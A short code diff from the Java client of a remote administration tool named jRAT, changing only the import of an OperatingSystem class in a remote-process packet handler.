@@ -6,7 +6,8 @@ import se.jrat.client.Slave;
 import se.jrat.client.ui.frames.FrameControlPanel;
 import se.jrat.client.ui.frames.FrameRemoteProcess;
 import se.jrat.client.ui.panels.PanelControlRemoteProcess;
-import se.jrat.common.OperatingSystem;
+
+import com.redpois0n.oslib.OperatingSystem;
 
 
 public class Packet20Process extends AbstractIncomingPacket {
